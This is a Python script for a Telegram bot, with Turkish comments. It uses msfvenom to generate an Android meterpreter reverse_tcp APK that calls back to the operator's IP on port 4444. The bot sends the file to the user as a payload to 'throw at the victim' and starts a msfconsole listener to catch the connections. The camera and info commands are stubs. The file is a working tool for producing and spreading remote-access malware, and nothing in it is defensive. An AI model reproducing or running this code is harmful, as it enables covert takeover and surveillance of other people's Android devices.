import telebot
import subprocess
import socket

# Telegram bot token'ınızı buraya yapıştırın
TOKEN = 'buraya'
bot = telebot.TeleBot(TOKEN)

# Payload oluşturma komutu
def create_payload(lhost, lport):
    payload_path = '/storage/emulated/0/Download/payload.apk'  # Android için uygun yol
    payload_command = f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {payload_path}'
    result = subprocess.run(payload_command, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error: {result.stderr}")
        return None
    return payload_path

# IP adresini alma
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

# Bot mesaj işleyicileri
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hoş geldiniz! Payload oluşturmak için 'başla' yazın.")

@bot.message_handler(func=lambda message: message.text.lower() == 'başla')
def handle_payload_creation(message):
    ip_address = get_ip_address()
    port = 4444  # Varsayılan port
    payload_path = create_payload(ip_address, port)
    if payload_path:
        bot.reply_to(message, f"Payload oluşturuldu! IP: {ip_address}, Port: {port}")
        try:
            with open(payload_path, 'rb') as payload:
                bot.send_document(message.chat.id, payload)
                bot.reply_to(message, "İşte kurbana atabileceğin payloadın.")
        except FileNotFoundError:
            bot.reply_to(message, "Payload dosyası bulunamadı. Lütfen yolu kontrol edin.")
    else:
        bot.reply_to(message, "Payload oluşturulamadı. Lütfen msfvenom kurulumunuzu kontrol edin.")

@bot.message_handler(func=lambda message: message.text.lower() == 'dinle')
def handle_listener(message):
    listener_command = 'msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"'
    subprocess.Popen(listener_command, shell=True)
    bot.reply_to(message, "Listener başlatıldı. Komutlar: /kamera, /bilgi")

# Kamera erişimi için örnek komut
@bot.message_handler(commands=['kamera'])
def handle_camera(message):
    # Buraya kamera erişim komutlarını ekleyin
    bot.reply_to(message, "Kamera erişimi sağlanamadı. Bu bir örnektir.")

# Bilgi komutu için örnek
@bot.message_handler(commands=['bilgi'])
def handle_info(message):
    bot.reply_to(message, "Bu bot, payload oluşturabilir ve dinleyebilir. Örnek komutlar: /kamera")

# Botu çalıştırma
if __name__ == '__main__':
    bot.polling()
